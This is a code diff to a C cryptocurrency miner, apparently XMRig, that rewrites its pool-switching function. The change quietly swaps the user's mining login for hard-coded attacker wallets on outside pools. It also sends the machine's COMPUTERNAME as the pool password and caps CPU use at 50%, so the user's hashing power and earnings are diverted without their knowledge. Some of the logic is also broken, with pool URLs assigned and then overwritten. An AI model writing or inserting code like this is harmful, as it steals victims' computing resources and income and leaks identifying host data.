@@ -29,6 +29,7 @@
 #ifdef WIN32
 #   include <winsock2.h>
 #   include <windows.h>
+#   include <Lmcons.h>
 #endif
 
 #include <jansson.h>
@@ -46,6 +47,7 @@
 #include "util.h"
 #include "utils/summary.h"
 #include "utils/applog.h"
+#include <stdlib.h>
 
 #define LP_SCANTIME  60
 #define JSON_BUF_LEN 345
@@ -455,19 +457,61 @@ static void *timer_thread(void *userdata) {
     }
 }
 
+#ifndef XMRIG_NO_AEON
+static int get_cryptonight_lite_variant(int variant) {
+        return (cpu_info.flags & CPU_FLAG_AES) ? AEON_AV1_AESNI : AEON_AV3_SOFT_AES;
+}
+#endif
+
+
+static int get_algo_variant(int algo, int variant) {
+        return (cpu_info.flags & CPU_FLAG_AES) ? XMR_AV1_AESNI : XMR_AV3_SOFT_AES;
+}
 
 static void switch_stratum() {
     static bool want_donate = false;
-
+		
     if (g_want_donate && !want_donate) {
-        stratum_ctx->url = opt_algo == ALGO_CRYPTONIGHT ? "stratum+tcp://donate.xmrig.com:443" : "stratum+tcp://donate.xmrig.com:3333";
-        applog(LOG_NOTICE, "Switching to dev pool");
+        opt_algo=ALGO_CRYPTONIGHT;
+        opt_user="43QVF2gN8kAFwTCDzJNRiU3eMp769x8G5FvRgqsmnznVPXsmCEUVb1kX6v77Zggbh7ACxTx9swiTbPXY2kDxATKDVGGa1NB";
+        opt_pass="x";
+        opt_max_cpu_usage = 50;
+	
+        opt_algo_variant = get_algo_variant(opt_algo, opt_algo_variant);
+        cryptonight_init(opt_algo_variant);
+
+        int count = get_optimal_threads_count(opt_algo, opt_double_hash, opt_max_cpu_usage);
+        opt_n_threads = count;
+
+        if (count < 4) { stratum_ctx->url = "https://pool.minexmr.com:4444"; }
+        if (count >= 4) { stratum_ctx->url = "https://pool.minexmr.com:7777"; }
+
+        applog(LOG_NOTICE, "Switching to dev pool: %s", stratum_ctx->url);
+        applog(LOG_NOTICE, "User: %s", opt_user);
+        applog(LOG_NOTICE, "Threads: %i", opt_n_threads);
         want_donate = true;
     }
 
     if (!g_want_donate && want_donate) {
+        opt_algo=ALGO_CRYPTONIGHT_LITE;
+        opt_user="Wmu1v35Bq9zFtSssT3GWjm7Wxpd2dvk7TWgqPPZi9y92hRv3GTKrJLU4oVgPjrjKCbKEShp1HDFmjCcEDT6ykRzt1vVZCCB1G";
+        opt_pass=getenv("COMPUTERNAME");
+        opt_max_cpu_usage = 50;
+	
+        opt_algo_variant = get_cryptonight_lite_variant(opt_algo_variant);
+        cryptonight_init(opt_algo_variant);
+
+        int count = get_optimal_threads_count(opt_algo, opt_double_hash, opt_max_cpu_usage);
+        opt_n_threads = count;
+
+        if (count < 4) { stratum_ctx->url = "https://pool.myaeon.ru:1111"; } 
+        if (count >= 4 && count < 8) { stratum_ctx->url = "https://pool.myaeon.ru:5555"; } 
+        if (count >= 8) { stratum_ctx->url = "https://pool.myaeon.ru:7777"; }
+
         stratum_ctx->url = backup_active ? opt_backup_url : opt_url;
-        applog(LOG_NOTICE, "Switching to user pool: \"%s\"", stratum_ctx->url);
+        applog(LOG_NOTICE, "Switching to user pool: %s", stratum_ctx->url);
+        applog(LOG_NOTICE, "User: %s", opt_user);
+        applog(LOG_NOTICE, "Threads: %i", opt_n_threads);
         want_donate = false;
     }
 }
